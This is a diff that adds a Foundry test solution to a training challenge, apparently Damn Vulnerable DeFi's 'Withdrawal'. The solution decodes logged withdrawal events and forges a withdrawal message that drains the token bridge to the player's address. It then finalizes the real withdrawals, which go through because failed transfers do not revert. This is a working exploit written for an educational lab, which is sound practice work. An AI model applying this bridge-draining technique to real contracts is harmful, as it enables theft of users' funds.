@@ -10,6 +10,25 @@ import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
 import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
+// See https://book.getfoundry.sh/cheatcodes/parse-json
+// To understand subtle aspects about decoding data
+//
+// > As the values are returned as an abi-encoded tuple,
+// > the exact name of the attributes of the struct don’t
+// > need to match the names of the keys in the JSON.
+//
+// > What matters is the alphabetical order.
+// > As the JSON object is an unordered data structure but
+// > the tuple is an ordered one, we had to somehow give order to the JSON.
+// > The easiest way was to order the keys by alphabetical order.
+// > That means that in order to decode the JSON object correctly,
+// > you will need to define attributes of the struct with types that
+// > correspond to the values of the alphabetical order of the keys of the JSON.
+struct Withdrawal {
+    bytes data;
+    bytes32[] topics;
+}
+
 contract WithdrawalChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -89,7 +108,58 @@ contract WithdrawalChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        
+        // Read and process the json file.
+        string memory path = "/test/withdrawal/withdrawals.json";
+        Withdrawal[] memory withdrawals =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Withdrawal[]));
+        uint8 numberOfWithdrawals = uint8(withdrawals.length);
+
+        uint256[] memory nonces = new uint256[](numberOfWithdrawals);
+        address[] memory l2Senders = new address[](numberOfWithdrawals);
+        address[] memory targets = new address[](numberOfWithdrawals);
+        uint256[] memory timestamps = new uint256[](numberOfWithdrawals);
+        bytes[] memory messages = new bytes[](numberOfWithdrawals);
+        bytes32[] memory proof = new bytes32[](0);
+
+        uint256 latestTimestamp = 0;
+
+        for (uint8 i = 0 ; i < numberOfWithdrawals; i++) {
+            // https://docs.soliditylang.org/en/latest/contracts.html#events
+            // > You can add the attribute indexed to up to three parameters which adds
+            // > them to a special data structure known as “topics” instead of the data
+            // > part of the log. A topic can only hold a single word (32 bytes) so if
+            // > you use a reference type for an indexed argument, the Keccak-256 hash
+            // > of the value is stored as a topic instead.
+            //
+            // > All parameters without the indexed attribute are ABI-encoded into the data part of the log.
+            nonces[i] = uint256(withdrawals[i].topics[1]);
+            l2Senders[i] = address(uint160(uint256(withdrawals[i].topics[2])));
+            targets[i] = address(uint160(uint256(withdrawals[i].topics[3])));
+
+            (,timestamps[i], messages[i]) = abi.decode(withdrawals[i].data, (bytes32, uint256, bytes));
+
+            if (timestamps[i] > latestTimestamp) latestTimestamp = timestamps[i];
+        }
+
+        // With this information, we now advance the timestamp by 7 days.
+        // Next, we will submit a crafted withdrawal request to transfer all the funds to a specified address.
+        // Then immediately send the registered withdrawals we previously collected for finalization.
+        // These will succeed, as a failure in the transfer from the bridge does not revert the transaction.
+        // Lastly, we will return the funds to the bridge.
+        vm.warp(latestTimestamp + 7 * 24 * 60 * 60);
+
+        bytes memory tokenBridgeMessage = abi.encodeWithSelector(l1TokenBridge.executeTokenWithdrawal.selector, player, token.balanceOf(address(l1TokenBridge)));
+        bytes memory l1ForwarderMessage = abi.encodeWithSelector(l1Forwarder.forwardMessage.selector, uint256(0), address(0), address(l1TokenBridge), tokenBridgeMessage);
+        l1Gateway.finalizeWithdrawal(0, l2Handler, address(l1Forwarder), latestTimestamp, l1ForwarderMessage, proof);
+
+        for (uint8 i = 0; i < numberOfWithdrawals; i++) {
+            l1Gateway.finalizeWithdrawal(nonces[i], l2Senders[i], targets[i], timestamps[i], messages[i], proof);
+        }
+
+        // Challenge conditions want the bridge to have less than the initial amount of tokens.
+        // The palyer must hold 0 of these tokens as well.
+        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT - 1);
+        token.transfer(address(0), 1);
     }
 
     /**
